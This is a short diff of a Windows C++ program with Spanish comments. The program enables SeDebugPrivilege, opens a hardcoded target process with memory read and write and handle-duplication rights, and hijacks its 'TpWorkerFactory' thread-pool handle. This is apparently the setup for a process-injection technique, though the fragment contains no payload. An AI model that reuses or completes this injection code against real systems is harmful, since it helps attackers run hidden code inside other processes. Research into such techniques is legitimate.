@@ -3,7 +3,7 @@
 #include<phnt.h>
 #include<iostream>
 #include<vector>
-#include"validate.hpp"
+#include"oldValidate.hpp"
 #pragma comment(lib, "ntdll")
 
 using namespace std;
@@ -69,10 +69,10 @@ void setCurrentProcessPrivilege(LPCSTR privilegeStr) {
 }
 
 int main() {
-    setCurrentProcessPrivilege("SeDebugPrivilege");
+    setCurrentProcessPrivilege("SeDebugPrivilege"); //He descubierto que solo necesitamos elevar los privilegios una vez para nuestro programa para que mantenga SeDebugPrivilege aun ejecutandolo como normal
     cout << "\nsetCurrentProcessPrivilege(): Exitoso";
     
-	DWORD targetPid = 8616; //Pedir al usuario escribir un pid y verificar si el pid existe
+	DWORD targetPid = 11324; //Pedir al usuario escribir un pid y verificar si el pid existe
     HANDLE hTarget = val(CHECK_HANDLE,"","13",   OpenProcess, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, targetPid);      //Eliminamos la comprobacion del handle resultado... Talvez los handles no contienen direcciones validas y solo se usan como IDs para pasar a las funciones de la winapi
 	
     HANDLE hProp = val(CHECK_HANDLE,"","14",   hijackProcessHandle, wstring(L"TpWorkerFactory"), hTarget, WORKER_FACTORY_ALL_ACCESS);
